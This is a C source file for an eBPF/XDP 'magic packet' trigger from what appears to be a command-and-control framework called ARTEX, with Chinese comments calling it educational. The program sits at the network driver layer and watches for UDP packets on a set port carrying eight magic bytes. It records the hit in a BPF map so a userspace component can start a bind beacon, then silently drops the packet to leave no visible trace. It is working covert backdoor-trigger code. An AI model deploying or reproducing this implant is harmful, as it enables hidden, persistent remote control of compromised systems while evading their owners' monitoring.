/* ARTEX C2 eBPF 触发器(XDP 魔法包版,契约 C2_CONTRACTS.md §19 stretch,Agent P)。
 *
 * 教育用途的最小 XDP 触发器:目标机加载后,在网卡驱动层静默监视「魔法包」——
 * 目的端口为 TRIGGER_PORT 的 UDP 报文,且载荷前 8 字节与 MAGIC_0..MAGIC_7 一致。
 * 命中则更新 BPF map 里的时间戳(供用户态轮询触发 bind beacon)并 XDP_DROP 丢弃,
 * 不在内核协议栈留下可见痕迹。
 *
 * 设计说明(有意为之):
 *   - 不依赖 bpf_helpers.h/libbpf:helper 与 map 定义在文件内手写,只需要
 *     linux/bpf.h(uapi 头,通常随 linux-libc-dev 提供)与 clang -target bpf,
 *     把 VPS 侧编译依赖压到最低;
 *   - tc(clsact ingress)等价用法见 load_trigger.sh 与 README.md;
 *   - 触发端口与魔法字节由加载脚本 -D 宏注入,各监听器可不同。
 */

#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/in.h>

#ifndef TRIGGER_PORT
#define TRIGGER_PORT 47771
#endif
#ifndef MAGIC_0
#define MAGIC_0 0x41
#endif
#ifndef MAGIC_1
#define MAGIC_1 0x52
#endif
#ifndef MAGIC_2
#define MAGIC_2 0x54
#endif
#ifndef MAGIC_3
#define MAGIC_3 0x45
#endif
#ifndef MAGIC_4
#define MAGIC_4 0x58
#endif
#ifndef MAGIC_5
#define MAGIC_5 0x32
#endif
#ifndef MAGIC_6
#define MAGIC_6 0x43
#endif
#ifndef MAGIC_7
#define MAGIC_7 0x32
#endif
#define MAGIC_LEN 8

#define SEC(NAME) __attribute__((section(NAME), used))

/* ---- 最小 helper/map 声明(替代 bpf_helpers.h,见头注释) ---- */

static void *(*bpf_map_lookup_elem)(const void *map, const void *key) =
	(void *)1;
static long (*bpf_map_update_elem)(const void *map, const void *key,
				   const void *value,
				   unsigned long long flags) = (void *)2;
static unsigned long long (*bpf_ktime_get_ns)(void) = (void *)5;

struct bpf_map_def {
	unsigned int type;
	unsigned int key_size;
	unsigned int value_size;
	unsigned int max_entries;
	unsigned int map_flags;
};

/* 命中时间戳:key=0;用户态轮询该 map 决定是否拉起 bind beacon。 */
struct bpf_map_def SEC("maps") trigger_map = {
	.type = BPF_MAP_TYPE_ARRAY,
	.key_size = sizeof(int),
	.value_size = sizeof(unsigned long long),
	.max_entries = 1,
	.map_flags = 0,
};

/* ---- XDP 程序 ---- */

SEC("xdp")
int xdp_trigger(struct xdp_md *ctx)
{
	void *data = (void *)(long)ctx->data;
	void *data_end = (void *)(long)ctx->data_end;

	struct ethhdr *eth = data;
	if ((void *)(eth + 1) > data_end)
		return XDP_PASS;
	if (eth->h_proto != __builtin_bswap16(ETH_P_IP))
		return XDP_PASS;

	struct iphdr *ip = (void *)(eth + 1);
	if ((void *)(ip + 1) > data_end)
		return XDP_PASS;
	if (ip->protocol != IPPROTO_UDP)
		return XDP_PASS;

	struct udphdr *udp = (void *)((char *)ip + ip->ihl * 4);
	if ((void *)(udp + 1) > data_end)
		return XDP_PASS;
	if (udp->dest != __builtin_bswap16(TRIGGER_PORT))
		return XDP_PASS;

	char *pl = (void *)(udp + 1);
	if ((void *)pl + MAGIC_LEN > data_end)
		return XDP_PASS;
	if (pl[0] != MAGIC_0 || pl[1] != MAGIC_1 || pl[2] != MAGIC_2 ||
	    pl[3] != MAGIC_3 || pl[4] != MAGIC_4 || pl[5] != MAGIC_5 ||
	    pl[6] != MAGIC_6 || pl[7] != MAGIC_7)
		return XDP_PASS;

	/* 命中:记录时间戳并静默丢弃魔法包(用户态轮询到新时间戳即拉起 beacon)。 */
	{
		int key = 0;
		unsigned long long ts = bpf_ktime_get_ns();
		bpf_map_update_elem(&trigger_map, &key, &ts, BPF_ANY);
	}
	return XDP_DROP;
}

char __attribute__((section(("license")), used)) _license[] = "GPL";
